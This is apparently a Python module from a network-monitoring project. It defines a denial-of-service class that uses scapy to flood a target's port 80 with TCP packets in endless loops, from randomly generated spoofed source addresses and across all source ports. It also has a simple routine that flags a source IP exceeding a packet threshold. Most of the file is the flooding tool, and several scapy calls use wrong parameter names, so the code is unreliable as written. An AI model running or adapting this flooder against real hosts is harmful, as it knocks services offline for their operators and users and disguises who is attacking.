from scapy.layers.inet import IP, TCP
from scapy.all import *
import random
import socket
import monitor.protocols.ipheader as ip_packet

DETECTION_IP_LIMIT = 15


# Denial of Service
class DoS:
    def __init__(self):
        self.run = False
        self.sent_packets_counter = 0

    @staticmethod
    def generate_ip():
        return str(random.randint(1,254)) + '.' + str(random.randint(1,254)) + '.' + str(random.randint(1,254)) +\
               '.' + str(random.randint(1,254))

    def stop(self):
        self.run = False

    def send_packet(self, src_ip, dest_ip, port):
        ip_header = IP(source_IP=src_ip, destination=dest_ip)
        tcp_header = TCP(srcport=port, dstport=80)
        send(ip_header/tcp_header, inter=.001)
        self.sent_packets_counter += 1

    def send_from_multi_ports(self, src_ip, dest_ip):
        for port in range(1, 65535):
            self.send_packet(src_ip, dest_ip, port)

    def attack(self, ip_addresses=None, port=None):
        self.sent_packets_counter = 0
        if ip_addresses and port:
            while self.run:
                self.send_packet(ip_addresses[0], ip_addresses[1], port)
        elif ip_addresses and not port:
            while self.run:
                self.send_from_multi_ports(ip_addresses[0], ip_addresses[1])
        elif not ip_addresses and port:
            while self.run:
                self.send_packet(self.generate_ip(), self.generate_ip(), port)
        else:
            while self.run:
                self.send_from_multi_ports(self.generate_ip(), self.generate_ip())

        return self.sent_packets_counter

    # detects the first ip address that exceeds the defined requests limits
    def detect_exceptional_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 8)
        ip_counter = {}
        while self.run:
            packet = s.recvfrom(2048)
            ip_header = ip_packet.IpHeader(packet[0][14:34])
            ip = socket.inet_ntoa(ip_header.source_ip)
            if ip_counter.has_key(ip):
                ip_counter[ip] += 1
                if ip_counter[ip] >= DETECTION_IP_LIMIT:
                    return ip
            else:
                ip_counter[ip] = 1
